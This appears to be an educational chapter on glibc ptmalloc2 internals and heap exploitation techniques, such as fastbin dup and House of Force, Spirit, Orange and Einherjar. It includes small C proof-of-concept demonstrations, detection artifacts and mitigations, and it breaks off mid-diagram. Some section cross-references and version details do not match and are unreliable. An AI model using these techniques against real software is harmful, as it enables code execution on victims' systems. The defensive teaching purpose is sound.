# Domain 3, Chapter 3B — Heap Exploitation: ptmalloc2, UAF, and Type Confusion

> **Scope.** The ptmalloc2 allocator: `malloc_chunk` structure and chunk flags, `malloc_state` and arena management, fastbins, tcache, small bins, large bins, the unsorted bin. The malloc and free algorithms. Named exploitation techniques: House of Force, Spirit, Lore, Orange, Einherjar, Storm. Poison null byte. Unsorted bin attack. Tcache poisoning, tcache house of spirit, tcache stashing unlink, tcache key double-free detection. Fastbin dup. Largebin attack. Userspace use-after-free and double-free exploitation. Heap spray. C++ type confusion: vtable pointer corruption, `typeid` bypass, `dynamic_cast` abuse. Vtable verification and CFI (cross-reference to Domain 4 §13). Allocator hardening landscape: glibc evolution, safe-linking, jemalloc, mimalloc, PartitionAlloc, Scudo, ARM MTE.
>
> **Orientation.** This chapter describes ptmalloc2's internal structures and the exploitation techniques that target them, framed for detection engineers (recognizing exploitation artifacts in crash dumps and heap forensics), hardening engineers (evaluating allocator-hardening options), and software architects (understanding why certain coding patterns are dangerous). Named techniques are described by prerequisite corruption, resulting primitive, and applicable mitigations.
>
> **Prerequisites.** Chapter 3A (stack layout, integer errors as root causes). Domain 2 Chapter 2A (mmap, brk, page faults). Domain 4 (code reuse — the payloads that heap exploitation enables).

---

## 1. The `malloc_chunk` structure

Every heap allocation in ptmalloc2 is represented as a `malloc_chunk`. The user receives a pointer to the "user data" region; the chunk header sits immediately before it:

```c
struct malloc_chunk {
    size_t mchunk_prev_size;    /* size of previous chunk (if free) */
    size_t mchunk_size;         /* size of this chunk including header */
    /* --- user data starts here (returned pointer) --- */
    struct malloc_chunk *fd;    /* forward pointer (free chunks only) */
    struct malloc_chunk *bk;    /* backward pointer (free chunks only) */
    /* large chunks only: */
    struct malloc_chunk *fd_nextsize;
    struct malloc_chunk *bk_nextsize;
};
```

The user pointer returned by `malloc` points at the `fd` field — the header (`prev_size` + `size`) sits before it. The minimum chunk size is 32 bytes on 64-bit (16-byte header + 16-byte minimum user area, which is also the minimum for the freelists' forward/backward pointers).

### 1.1 Exact field offsets and sizes

On 64-bit systems, `size_t` is 8 bytes and all pointers are 8 bytes. Chunks are aligned to 16-byte boundaries (the `MALLOC_ALIGNMENT` constant), meaning the bottom 4 bits of any chunk address are always zero, and the bottom 4 bits of the `mchunk_size` field are available for flags.

```
64-bit malloc_chunk layout (in-use):

Offset   Size    Field
──────   ────    ─────────────────────────────────────
+0x00    8       mchunk_prev_size  (usable by previous chunk's data
                                    when previous chunk is in-use)
+0x08    8       mchunk_size       (including header, bottom 3 bits = flags)
+0x10    ...     user data starts here  ← pointer returned by malloc()
```

```
64-bit malloc_chunk layout (free, in a bin):

Offset   Size    Field
──────   ────    ─────────────────────────────────────
+0x00    8       mchunk_prev_size
+0x08    8       mchunk_size
+0x10    8       fd                (forward pointer in freelist)
+0x18    8       bk                (backward pointer in freelist)
+0x20    8       fd_nextsize       (large bins only)
+0x28    8       bk_nextsize       (large bins only)
```

On 32-bit systems, `size_t` is 4 bytes, pointers are 4 bytes, and `MALLOC_ALIGNMENT` is 8 bytes. The minimum chunk size is 16 bytes (8-byte header + 8-byte minimum user area). The field layout shifts accordingly:

```
32-bit malloc_chunk layout (free, in a bin):

Offset   Size    Field
──────   ────    ─────────────────────────────────────
+0x00    4       mchunk_prev_size
+0x04    4       mchunk_size       (bottom 3 bits = flags)
+0x08    4       fd
+0x0c    4       bk
+0x10    4       fd_nextsize       (large bins only)
+0x14    4       bk_nextsize       (large bins only)
```

A critical implementation detail: when a chunk is in-use, its `prev_size` field is borrowed by the previous chunk to extend that chunk's usable data area. This overlap is the reason the minimum allocation overhead is only 8 bytes on 64-bit (just the `mchunk_size` field) rather than 16 bytes — the `prev_size` of the next chunk in memory serves double duty. When the chunk is freed, `prev_size` stores the size of the physically preceding free chunk for backward coalescing.

### 1.2 Chunk flags

The bottom 3 bits of `mchunk_size` are flags (the size is always 16-byte-aligned on 64-bit, so bits 0–3 are available):

**Bit 0: `PREV_INUSE` (P).** If set, the previous chunk (at lower address) is in use. If clear, the previous chunk is free, and `mchunk_prev_size` contains its size (enabling backward coalescing on `free`). This is the most exploitation-relevant flag. The macro `PREV_INUSE` is `0x1`. An attacker who clears this bit and forges a fake `prev_size` can trick `free` into coalescing backward with a "previous free chunk" that does not exist or exists at an attacker-chosen location.

**Bit 1: `IS_MMAPPED` (M).** Value `0x2`. The chunk was allocated via `mmap` rather than from the arena. `free` on such a chunk calls `munmap` directly, bypassing the arena's bins entirely. If an attacker sets this bit on a heap-managed chunk, `free` will call `munmap` on a heap address — potentially unmapping pages the attacker wants to remap.

**Bit 2: `NON_MAIN_ARENA` (A).** Value `0x4`. The chunk belongs to a non-main arena (a secondary arena created for multi-threaded performance). The allocator uses this bit to locate the arena descriptor from a chunk address: for the main arena, the arena is the global `main_arena`; for secondary arenas, the arena descriptor is found by masking the chunk address to the heap's base.

The actual size of a chunk is obtained by masking off the flag bits: `chunksize(p) = p->mchunk_size & ~(0x7)`. This is implemented as the `SIZE_BITS` mask.

---

## 2. Arenas and `malloc_state`

ptmalloc2 uses **arenas** to reduce lock contention in multi-threaded programs. The **main arena** (`main_arena`, a global variable in libc) manages the `brk` heap. Additional arenas are created on demand when threads contend on the main arena's lock; each secondary arena manages its own `mmap`'d heap.

### 2.1 The `malloc_state` structure

`struct malloc_state` (the arena descriptor) contains:

- **`mutex`**: a `pthread_mutex_t` serializing access to the arena. Every `malloc`/`free` that operates on arena bins must hold this mutex.
- **`flags`**: arena state flags (e.g., `FASTCHUNKS_BIT` indicating outstanding fastbin chunks, `NONCONTIGUOUS_BIT` for arenas that may have non-contiguous heaps).
- **`have_fastchunks`**: separate flag (in newer glibc) replacing `FASTCHUNKS_BIT`.
- **`fastbinsY[NFASTBINS]`**: array of 10 fastbin heads (singly-linked LIFO lists).
- **`top`**: pointer to the top chunk — the chunk representing all remaining unallocated space at the end of the arena's heap.
- **`last_remainder`**: the last chunk produced by splitting a larger chunk. Used to improve locality for successive small allocations.
- **`bins[NBINS * 2 - 2]`**: array of bin heads for small bins, large bins, and the unsorted bin. Each bin is represented by a pair of `fd`/`bk` pointers. `bins[0]` is unused; `bins[1]` is the unsorted bin; `bins[2]`–`bins[63]` are small bins; `bins[64]`–`bins[126]` are large bins.
- **`binmap[BINMAPSIZE]`**: a bitmap indicating which bins are non-empty, used to skip empty bins during searching.
- **`next`**: linked list of arenas.
- **`next_free`**: linked list of arenas with available capacity.
- **`attached_threads`**: reference count of threads currently attached to this arena.
- **`system_mem`** / **`max_system_mem`**: total memory obtained from the system for this arena.

### 2.2 Arena management and thread binding

When a thread calls `malloc` for the first time, ptmalloc2 tries to attach it to an existing arena. The algorithm prefers `main_arena`, then iterates the arena list looking for one whose mutex can be acquired without blocking. If all arenas are contended, a new arena is created via `_int_new_arena` (which `mmap`'s a new heap region, typically 64 MB on 64-bit).

The maximum number of arenas is bounded by `8 * number_of_CPUs` (for 64-bit) or `2 * number_of_CPUs` (for 32-bit). This cap prevents unbounded memory overhead from arena proliferation.

Exploitation relevance: `main_arena` is at a known offset within libc. A libc address leak reveals `main_arena`'s address, and from it the attacker can locate the bin arrays, the top chunk, and other metadata. `main_arena` is in libc's `.data` segment and is writable (it must be, since the allocator updates it constantly). Overwriting fields in `main_arena` (e.g., the `top` pointer, the fastbin heads, or bin entries) from an arbitrary-write primitive gives direct control over the allocator's behavior.

---

## 3. Bin types

### 3.1 Fastbins

Fastbins are singly-linked LIFO (stack-like) freelists for small chunks. The `fastbinsY` array in `malloc_state` has 10 entries, covering chunk sizes from 32 bytes (minimum) to 176 bytes (on 64-bit, in 16-byte increments). The default `global_max_fast` is 128 bytes (meaning only chunk sizes 32, 48, 64, 80, 96, 112, and 128 are used by default), but the implementation reserves slots up to 176 bytes and `global_max_fast` can be configured with `mallopt(M_MXFAST, ...)`.

```
Fastbin index → chunk size (64-bit, default global_max_fast = 128):

Index   Chunk size (bytes)   User data size
─────   ──────────────────   ──────────────
  0          32                   16
  1          48                   32
  2          64                   48
  3          80                   64
  4          96                   80
  5         112                   96
  6         128                  112
  7         144                  128  (only if global_max_fast raised)
  8         160                  144  (only if global_max_fast raised)
  9         176                  160  (only if global_max_fast raised)
```

When a chunk is freed and its size falls within the fastbin range, it is pushed onto the appropriate fastbin list. Its `fd` pointer is set to the previous head of the list. The `PREV_INUSE` flag of the *next* chunk is **not** cleared (fastbin chunks remain marked as "in use" to their neighbors, preventing coalescing). This is a performance optimization: small chunks are expected to be freed and reallocated frequently, and skipping coalescing reduces overhead.

Allocation from a fastbin: pop the head and return it. The allocator verifies the chunk's size field matches the bin's expected size (the "fastbin size check"), which prevents a corrupted `fd` from returning a chunk of the wrong size. However, this check can be bypassed by finding or creating a naturally occurring size-field-like value near the desired target address (the well-known "0x7f trick" for targeting `__malloc_hook` on 64-bit, where a misaligned read of libc's `.data` section yields a value that passes the size check for fastbin index 5).

**Fastbin dup (double-free).** Historically, freeing the same chunk twice into a fastbin created a cycle in the freelist: `A → B → A → B → ...`. The next three allocations would return A, B, A — giving the attacker two "different" pointers to the same memory. The mitigation is a check at the top of `_int_free`'s fastbin path: `if (old == p)` — detecting immediate double-free of the same chunk. But this check only catches freeing the same chunk *consecutively*. Interleaving a different free (`free(A); free(B); free(A)`) bypasses it.

```c
/* Fastbin dup — classic technique (pre-glibc 2.32 safe-linking) */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
    /* All allocations are the same size → same fastbin */
    void *a = malloc(0x30);  /* chunk size 0x40 (64 bytes) */
    void *b = malloc(0x30);
    void *c = malloc(0x30);

    free(a);      /* fastbin[2]: A → NULL */
    free(b);      /* fastbin[2]: B → A → NULL */
    free(a);      /* fastbin[2]: A → B → A → B → ... (cycle) */

    /* First alloc returns A */
    void *d = malloc(0x30);
    /* Write a target address into A's fd field */
    *(unsigned long *)d = (unsigned long)0xdeadbeef;
    /* Next alloc returns B */
    void *e = malloc(0x30);
    /* Next alloc returns A again — but fd was overwritten */
    void *f = malloc(0x30);
    /* Next alloc returns 0xdeadbeef — arbitrary address */
    void *g = malloc(0x30);

    printf("Got allocation at: %p\n", g);
    return 0;
}
```

Tcache (§3.2) has a more robust detection mechanism via the `key` field.

**`malloc_consolidate`.** When `malloc` needs to search small/large bins and there are outstanding fastbin chunks, it calls `malloc_consolidate`, which iterates all fastbins, moves chunks to the unsorted bin, and coalesces adjacent free chunks. This is where fastbin chunks "become real free chunks" and can participate in coalescing — and where stale fastbin metadata can cause confusion if it has been corrupted.

### 3.2 Tcache (per-thread cache)

Tcache (added in glibc 2.26) is a per-thread, lock-free cache that sits in front of the arena's bins. Each thread has a `tcache_perthread_struct` allocated as the first chunk on the heap:

```c
typedef struct tcache_perthread_struct {
    uint16_t counts[TCACHE_MAX_BINS];   /* 64 bins */
    tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

There are 64 tcache bins, covering chunk sizes from 32 to 1040 bytes (on 64-bit, 16-byte increments: 32, 48, 64, ..., 1024, 1040). Each bin is a singly-linked LIFO list, holding up to 7 entries (default `TCACHE_FILL_COUNT`).

```c
typedef struct tcache_entry {
    struct tcache_entry *next;
    struct tcache_perthread_struct *key;  /* double-free detection */
} tcache_entry;
```

The `next` field occupies the same offset as `fd` in a `malloc_chunk` (offset `+0x10` from the chunk header, or offset `+0x00` from the user data pointer). The `key` field occupies the `bk` position (offset `+0x18` from the chunk header, or `+0x08` from the user data pointer).

**`tcache_put`** (free path): inserts the chunk at the head of the appropriate tcache bin. Sets `entry->key` to a pointer to the `tcache_perthread_struct` (the "tcache key" — used for double-free detection). Increments `counts[tc_idx]`.

**`tcache_get`** (alloc path): pops the head of the appropriate tcache bin. Clears `entry->key`. Decrements `counts[tc_idx]`.

**Double-free detection.** On `tcache_put`, if `entry->key == tcache` (the chunk is already in a tcache bin), ptmalloc2 scans the entire tcache bin for the chunk and aborts if found. This detects double-frees into tcache. The detection relies on the `key` field being intact — an attacker who can overwrite the `key` field (e.g., via a partial overwrite or a UAF write to a single `size_t` at offset `+0x08` from the user data pointer) can bypass the check. Any value other than the `tcache_perthread_struct` pointer causes the check to be skipped.

**Tcache key evolution (glibc 2.32+).** In glibc 2.34, the tcache key was changed from the `tcache_perthread_struct` pointer to a per-thread random value (`tcache_key`), making it harder to predict or forge. However, leaking the key value (e.g., through an information disclosure vulnerability that reads freed memory) still enables bypass.

**Safe-linking (glibc 2.32+).** Tcache's `next` pointer (and fastbin's `fd` pointer) are now obfuscated:

```c
/* Encoding: store (ptr ^ (&slot >> 12)) instead of raw ptr */
#define PROTECT_PTR(pos, ptr) \
    ((__typeof(ptr))((((size_t)pos) >> 12) ^ ((size_t)ptr)))
#define REVEAL_PTR(pos, ptr) \
    PROTECT_PTR(pos, ptr)   /* XOR is self-inverse */
```

The pointer is XORed with a value derived from its own storage address, shifted right by 12 bits (aligning to page boundaries). The page-aligned shift means the obfuscation key is the same for all entries within the same heap page, but differs across pages. An attacker must know the storage address of the tcache entry to forge a valid `next` pointer. A heap address leak (to the page level) is required in addition to the write primitive.

An important property: the first entry in any tcache bin has `next = NULL` (the end of the list). After safe-linking encoding, the stored value is `PROTECT_PTR(pos, NULL) = (&pos >> 12)`. Reading this leaked value reveals the heap page address, which is sufficient to compute the XOR key for other entries on the same page. This means a single heap leak of a free chunk's `next` field (when the list has length 1) reveals the safe-linking secret for that page.

### 3.3 Small bins

Small bins are circular doubly-linked lists (using `fd` and `bk` pointers). There are 62 small bins covering sizes from 32 to 1008 bytes on 64-bit (16-byte increments). Each bin holds chunks of exactly one size. On 32-bit, the range is 16 to 504 bytes in 8-byte increments.

Allocation: FIFO (take from `bk` end, the "last" element). Insertion: LIFO (insert at `fd` end, the "first" element). This FIFO policy means the oldest freed chunk is reused first, improving temporal locality.

The classic **unlink** operation: when coalescing removes a free chunk from its bin, it performs `FD->bk = BK; BK->fd = FD` (doubly-linked list removal). Historically, corrupting `fd` and `bk` of a free chunk gave an arbitrary write via unlink: `*(attacker_addr + offset) = attacker_value`. Modern glibc adds a "safe unlink" check: `if (FD->bk != P || BK->fd != P) abort()` — verifying the list is consistent before unlinking.

### 3.4 Large bins

Large bins hold chunks from 1024 bytes upward, organized in 63 bins. The bins are divided into geometrically increasing size ranges:

```
Large bin ranges (64-bit):

Bins   0– 31: 32 bins, each covering a 64-byte range
               (1024–1087, 1088–1151, ..., 3008–3071)
Bins  32– 47: 16 bins, each covering a 512-byte range
Bins  48– 55:  8 bins, each covering a 4096-byte range
Bins  56– 59:  4 bins, each covering a 32768-byte range
Bins  60– 61:  2 bins, each covering a 262144-byte range
Bin       62:  1 bin for all remaining sizes
```

Within a bin, chunks are sorted by size (largest first). The `fd_nextsize`/`bk_nextsize` pointers form a secondary list linking distinct sizes, enabling faster search — a "skip list" property that avoids scanning same-size chunks.

Allocation: find the smallest chunk that satisfies the request; if it is larger than needed, split it and return the remainder to the unsorted bin.

Exploitation relevance: the `fd_nextsize`/`bk_nextsize` pointers, combined with the size-sorted insertion logic, have been the target of several corruption techniques (House of Storm, §4.7; largebin attack, §4.9).

### 3.5 The unsorted bin

The unsorted bin is a single circular doubly-linked list (`fd`/`bk`). It serves as a holding area: newly freed chunks (after tcache/fastbin are full) and chunks split from larger allocations go into the unsorted bin. On the next allocation, the allocator iterates the unsorted bin, placing each chunk into the appropriate small or large bin, and returning any exact-fit chunk.

The unsorted bin's `bk` pointer in the `main_arena` structure (`unsorted_chunks(av)->bk`) points to the most recently inserted unsorted-bin chunk. This pointer is the target of the "unsorted bin attack" (§4.5).

---

## 4. The `_int_malloc` and `_int_free` algorithms

Understanding the allocation and deallocation algorithms is essential for exploitation: every named technique targets a specific code path within these algorithms.

### 4.1 `_int_malloc` walkthrough

When a thread calls `malloc(size)`, the following path is taken (simplified, in priority order):

1. **Tcache check.** If a tcache bin for the requested size has entries (`counts[tc_idx] > 0`), pop the head and return it. This is the fast path — no mutex, no arena interaction.

2. **Fastbin check.** If the requested size falls in the fastbin range, acquire the arena mutex and check the corresponding fastbin. If non-empty, pop the head. If the corresponding tcache bin has room, refill the tcache from the fastbin (moving additional entries from the fastbin into the tcache, up to `TCACHE_FILL_COUNT`). Return the first chunk.

3. **Small bin check.** If the requested size falls in the small-bin range, check the corresponding small bin. If non-empty, remove the last element (`victim = bin->bk`, unlink). If the corresponding tcache bin has room, stash additional small-bin chunks into tcache (the "tcache stashing" optimization — this is the code path targeted by tcache stashing unlink, §5.3). Return the victim.

4. **Consolidate fastbins.** If there are outstanding fastbin chunks (`have_fastchunks` is set), call `malloc_consolidate` to merge them into the unsorted bin. This converts fastbin chunks into coalesced free chunks available for larger allocations.

5. **Unsorted bin scan.** Iterate the unsorted bin. For each chunk:
   - If the chunk is an exact fit for the request, remove it and return it.
   - If the chunk is a small-bin-sized chunk, place it into the appropriate small bin.
   - If the chunk is a large-bin-sized chunk, place it into the appropriate large bin.
   - While iterating, if the corresponding tcache bin is not full and the chunk is an exact size match, stash the chunk into tcache instead of returning it directly (to fill the tcache for future allocations). Return a tcache entry at the end.

6. **Large bin search.** If the requested size is in the large-bin range, search the large bins starting from the bin for the requested size, then scan successively larger bins (using the `binmap` to skip empty bins) until a chunk large enough is found. If the chunk is larger than needed, split it: return the requested portion, and insert the remainder into the unsorted bin.

7. **Top chunk.** If no bin can satisfy the request, carve from the top chunk. If the top chunk is large enough, split it: advance the top-chunk pointer and return the new allocation. If the top chunk is too small, proceed to the next step.

8. **`sysmalloc`.** Extend the heap via `brk` (for the main arena) or `mmap` (for secondary arenas, or for very large requests — above `mmap_threshold`, default 128 KB). For `brk`, the old top chunk may be freed into the unsorted bin. For very large allocations, a dedicated `mmap` region is created (the chunk will have `IS_MMAPPED` set).

### 4.2 `_int_free` walkthrough

When `free(ptr)` is called:

1. **Tcache path.** If the chunk size is within tcache range and the corresponding tcache bin is not full (`counts[tc_idx] < TCACHE_FILL_COUNT`), insert the chunk into the tcache bin via `tcache_put`. Set the `key` field for double-free detection. Return.

2. **Fastbin path.** If the chunk size is within the fastbin range (`< global_max_fast`), push the chunk onto the corresponding fastbin. Perform the consecutive-double-free check (`if (old == p) abort()`). Set the chunk's `fd` to the previous fastbin head. Do not clear the next chunk's `PREV_INUSE` bit. Return.

3. **Consolidation path.** For chunks outside fastbin/tcache range:
   - **Backward coalescing:** Check the `PREV_INUSE` bit. If clear, the previous chunk is free — read `prev_size`, compute the previous chunk's address, unlink it from its bin, and merge (increase the current chunk's size by `prev_size`, move the chunk pointer backward). This is where a forged `prev_size` with a cleared `PREV_INUSE` bit causes the allocator to coalesce with a fake chunk (House of Einherjar, §4.6).
   - **Forward coalescing:** Check if the next chunk is the top chunk. If so, merge into the top chunk and return. Otherwise, check the next chunk's `PREV_INUSE` bit (actually the `PREV_INUSE` bit of the chunk *after* the next chunk, which indicates whether the next chunk is free). If the next chunk is free, unlink it and merge.
   - Insert the resulting (possibly merged) chunk into the unsorted bin. Set the `PREV_INUSE` bit of the chunk's next neighbor to `0` (indicating this chunk is now free) and set that neighbor's `prev_size` to this chunk's size.

4. **`mmap`'d chunk.** If `IS_MMAPPED` is set, call `munmap` directly. No bin interaction.

5. **Heap trim.** If the top chunk exceeds `trim_threshold` (default 128 KB), call `systrim` (for `brk`-based heap) or `heap_trim` (for secondary arenas) to return memory to the OS.

---

## 5. Named exploitation techniques

Each technique is described by: the required corruption primitive, the resulting exploitation primitive, the mechanism at byte level, exploitation code, real CVEs where applicable, detection artifacts, and what mitigations defeat it.

### 5.1 House of Force

**Corruption needed.** Overwrite the top chunk's size field with a very large value (typically `-1` or `0xFFFFFFFFFFFFFFFF`).

**Mechanism.** The top chunk is the last chunk in the arena, representing all remaining unallocated heap space. When `_int_malloc` cannot satisfy a request from bins (step 7 in §4.1), it carves from the top chunk by:

```c
/* Simplified from glibc _int_malloc */
victim = av->top;
size = chunksize(victim);
if ((unsigned long)(size) >= (unsigned long)(nb + MINSIZE)) {
    remainder_size = size - nb;
    remainder = chunk_at_offset(victim, nb);
    av->top = remainder;
    /* set headers... */
    return chunk2mem(victim);
}
```

With the top chunk's size corrupted to `0xFFFFFFFFFFFFFFFF`, the condition `size >= nb + MINSIZE` passes for any `nb`. The attacker computes a `malloc` size that causes `av->top` to advance to a target address:

```
target_address = current_top + nb
nb = target_address - current_top - (2 * SIZE_SZ)
```

The next `malloc` returns memory at the target address.

```c
/* House of Force — conceptual demonstration */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* Simulates a heap overflow that corrupts the top chunk */
int main(void) {
    char *a = malloc(0x100);
    printf("First allocation at: %p\n", a);

    /* In a real exploit, a heap overflow from 'a' would reach
       the top chunk's size field. Here we simulate it. */
    size_t *top_size_ptr = (size_t *)(a + 0x100 + 0x8);
    /* Corrupt top chunk size to maximum */
    *top_size_ptr = (size_t)-1;

    /* Calculate distance from top chunk to target.
       Target: a stack variable, a GOT entry, __malloc_hook, etc. */
    void *target = &target;  /* example: overwrite a stack variable */
    void *top_chunk = (void *)(a + 0x100 + 0x10);
    ptrdiff_t distance = (char *)target - (char *)top_chunk;

    /* Advance top chunk to just before target */
    void *b = malloc(distance - 0x10);

    /* This allocation returns memory overlapping the target */
    void *c = malloc(0x100);
    printf("Controlled allocation at: %p (target was: %p)\n", c, target);

    return 0;
}
```

**Detection artifacts.** A top chunk with size `0xFFFFFFFFFFFFFFFF` or any value implausibly large relative to the process's heap size. In crash dumps, a top-chunk pointer that has moved to a non-heap address (stack, libc `.data`, etc.).

**Mitigations.** glibc 2.29+ adds a check that the top chunk's size does not exceed `system_mem` for the arena: `assert((unsigned long)(old_size) < (unsigned long)(mp_.mmap_threshold * 4 + HEAP_MAX_SIZE))`. This check prevents the classic House of Force. The technique is effectively dead on modern glibc.

### 5.2 House of Spirit

**Corruption needed.** Write a fake chunk header at an arbitrary address (typically on the stack or in a global), then free a pointer pointing at the fake chunk's user-data region.

**Mechanism.** The attacker constructs a fake chunk at a target location by writing a valid `mchunk_size` field. When the program frees a pointer that has been corrupted to point at this fake chunk, `free` treats it as a legitimate heap chunk and inserts it into a bin (fastbin or tcache). A subsequent `malloc` of the matching size returns the fake chunk's address, giving the attacker a "legitimate" allocation at an arbitrary location.

For fastbin-targeted House of Spirit, the fake chunk must also have a valid next-chunk size field (the allocator checks that the chunk following the fake chunk has a plausible size). For tcache-targeted House of Spirit (pre-safe-linking), only the size field must be valid — tcache performs fewer sanity checks.

```c
/* House of Spirit — stack-targeted variant */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main(void) {
    /* Target: overwrite a local variable on the stack */
    uint64_t stack_var = 0;

    /* Construct fake chunk on the stack.
       The fake chunk needs: a valid size field, and for fastbin,
       a valid next-chunk size.  */
    uint64_t fake_chunk[6];

    /* fake_chunk[0] = prev_size (irrelevant) */
    fake_chunk[0] = 0;
    /* fake_chunk[1] = size: 0x40 (64 bytes) with PREV_INUSE set */
    fake_chunk[1] = 0x41;
    /* fake_chunk[2..3] = user data (fd, bk — will be used by freelist) */
    fake_chunk[2] = 0;
    fake_chunk[3] = 0;

    /* Next chunk's size field must also look valid.
       Place it at fake_chunk + 0x40 bytes from chunk start,
       which is fake_chunk + 8 entries (each 8 bytes).  */
    /* We need memory at offset +0x40 from &fake_chunk[0].
       That is fake_chunk[8] — but our array is only 6 elements.
       In practice, the attacker arranges stack layout carefully. */

    /* User-data pointer = &fake_chunk[2] */
    void *fake_ptr = &fake_chunk[2];

    /* If the program frees this pointer (e.g., through a pointer
       overwrite vulnerability), the fake chunk enters the bin.
       Then the next malloc(0x30) returns &fake_chunk[2],
       overlapping stack memory. */
    free(fake_ptr);

    /* Now malloc returns our fake stack chunk */
    char *controlled = malloc(0x30);
    printf("Allocated at: %p (stack region: %p)\n",
           controlled, &stack_var);

    return 0;
}
```

**Detection artifacts.** Freed chunks whose addresses fall outside the heap region (`[brk_base, brk_base + system_mem]` for the main arena, or outside any `mmap`'d heap region). In ASan, freeing a non-heap address triggers an immediate error.

**Mitigations.** Safe-linking (glibc 2.32+) makes tcache-targeted House of Spirit harder because the `next` pointer must be correctly encoded. The attacker must know the heap address to encode the fake `next` pointer. Fastbin size checks verify the next-chunk size is within bounds.

### 5.3 House of Lore

**Corruption needed.** Corrupt the `bk` pointer of a small-bin chunk.

**Mechanism.** When the allocator removes a chunk from a small bin, the removal code is:

```c
bck = victim->bk;
/* safe unlink check */
if (bck->fd != victim) abort();
bin->bk = bck;
bck->fd = bin;
```

If the attacker corrupts `victim->bk` to point at a fake chunk, and ensures the fake chunk's `fd` field points back to `victim` (to pass the safe-unlink check), then after removal: `bin->bk = fake_chunk`. On the next allocation from this small bin, the allocator removes `fake_chunk` (via `bin->bk`), returning the attacker's chosen address.

The constraint is tight: the attacker must place a pointer at `fake_chunk->fd` that equals `victim`'s address. This requires a heap address leak. Nevertheless, the technique provides an arbitrary-allocation primitive once the constraint is satisfied.

**Mitigations.** The safe-unlink check (`bk->fd == victim`) is the primary defense. It does not defeat the technique outright but requires an additional info leak.

### 5.4 House of Orange

**Corruption needed.** Corrupt the top chunk's size to a value smaller than the actual remaining space, with specific alignment properties: the new size must be page-aligned (after adding the chunk's start address, the end must land on a page boundary), and must have `PREV_INUSE` set.

**Mechanism.** This technique is notable because it requires **no explicit `free` call** — the attacker triggers `free` internally within the allocator. The steps:

1. Corrupt the top chunk's size field to a small value (e.g., `0xc01`). The allocator believes the heap is nearly exhausted.
2. Request a large allocation that exceeds the (corrupted) top chunk size. The allocator calls `sysmalloc`, which calls `_int_free` on the old top chunk, placing it into the unsorted bin.
3. Now the attacker has a chunk in the unsorted bin without ever calling `free` directly. The attacker corrupts this unsorted-bin chunk's metadata to set up a `_IO_FILE` exploitation chain.
4. The corrupted chunk triggers the `_IO_FILE` vtable call during allocator error handling (`abort()` → `fflush(stderr)` → `_IO_flush_all_lockp`) or during a subsequent allocation that processes the unsorted bin.

The `_IO_FILE` exploitation works because `_IO_list_all` (the head of the linked list of `_IO_FILE` structures) can be overwritten via the unsorted bin attack component. The attacker crafts the unsorted-bin chunk to simultaneously serve as a fake `_IO_FILE` structure with a forged vtable pointer. When the allocator's integrity checks detect corruption and call `abort`, the abort handler calls `fflush`, which iterates `_IO_list_all` and calls the `overflow` function pointer from the vtable — now pointing at attacker-controlled code.

**Real CVE.** The technique was originally demonstrated without a specific CVE; it was designed for CTF competitions. However, the `_IO_FILE` exploitation chain it pioneered has been used in numerous real-world vulnerabilities.

**Mitigations.** glibc 2.24+ added vtable validation for `_IO_FILE` operations: the vtable must point within the `__libc_IO_vtables` section. This blocks arbitrary vtable pointers. Variants using `_IO_str_overflow` (whose vtable is within the valid section) with carefully crafted `_IO_write_ptr` and `_IO_buf_end` can still achieve code execution on glibc 2.24–2.27. glibc 2.28+ added further checks on `_IO_FILE` fields. The top-chunk size validation added in glibc 2.29 also impedes the first step.

### 5.5 Unsorted bin attack

**Corruption needed.** Overwrite the `bk` pointer of a chunk in the unsorted bin with `target_address - 0x10` (on 64-bit, the offset to reach the `bk` position from the target write location).

**Mechanism.** When `_int_malloc` iterates the unsorted bin (step 5 in §4.1), for each chunk `victim`:

```c
bck = victim->bk;
/* ... size checks, exact-fit check ... */
/* Place victim into appropriate bin */
unsorted_chunks(av)->bk = bck;
bck->fd = unsorted_chunks(av);   /* THE WRITE */
```

The line `bck->fd = unsorted_chunks(av)` writes the address of `unsorted_chunks(av)` (which is `&main_arena.bins[0]` — a libc address) to `bck + 0x10` (the `fd` offset). If `bck` is `target_address - 0x10`, the write lands at `target_address`.

This is not a fully controlled write — the value written is a fixed libc address, not an attacker-chosen value. But it is sufficient for many purposes: overwriting `_IO_list_all` with a libc address (for House of Orange chaining), overwriting `global_max_fast` with a large libc address (to make all sizes eligible for fastbin operations, enabling further exploitation), or corrupting any variable where a large non-zero value is useful.

**Detection artifacts.** After exploitation, the target location contains a pointer into `main_arena` — an address in libc's `.data` segment. If the target was `global_max_fast`, subsequent allocations of arbitrarily large sizes will be served from fastbins, which is observable in heap forensics.

**Mitigations.** glibc 2.29+ adds: `if (__glibc_unlikely(bck->fd != victim)) malloc_printerr("corrupted unsorted chunks 2")`. This verifies that the unsorted bin's backward link is consistent, detecting the corrupted `bk`.

### 5.6 House of Einherjar

**Corruption needed.** A single null-byte overflow ("poison null byte") that clears the `PREV_INUSE` flag of the chunk following the overflowed buffer, combined with a forged `prev_size` in the overflowed buffer.

**Mechanism.** Consider three adjacent chunks: A (allocated), B (allocated, the overflow target), and C (allocated). The attacker overflows A by one byte, corrupting the least significant byte of B's `mchunk_size`. If this byte was, say, `0x91` (`PREV_INUSE` set, chunk size `0x90`), the null byte makes it `0x00`. Now `PREV_INUSE` is clear and the chunk size is also corrupted.

More precisely, the attacker aims to clear bit 0 of chunk C's `mchunk_size` (the `PREV_INUSE` bit relative to chunk B) and set chunk C's `prev_size` to point back to a fake chunk or to chunk A. When chunk C is freed, `_int_free` sees `PREV_INUSE == 0`, reads `prev_size`, and attempts backward coalescing:

```c
if (!prev_inuse(p)) {
    prevsize = prev_size(p);
    size += prevsize;
    p = chunk_at_offset(p, -((long)prevsize));
    /* Unlink the "previous" chunk from its bin */
    unlink_chunk(av, p);
}
```

The coalesced chunk now spans memory that includes chunk B's user data — creating an overlapping-chunk condition. The attacker can allocate from this coalesced chunk and receive memory that overlaps with still-in-use data.

```
Before exploitation:
┌────────┐ ┌────────┐ ┌────────┐
│ Chunk A │ │ Chunk B │ │ Chunk C │
│ (alloc) │ │ (alloc) │ │ (alloc) │
└────────┘ └────────┘ └────────┘

After null-byte overflow + free(C):
┌───────────────────────────────┐
│   Coalesced "free" chunk      │  ← allocator believes this is one
│   spans A + B + C             │     large free chunk
│   B's data is still in use    │  ← overlapping allocation possible
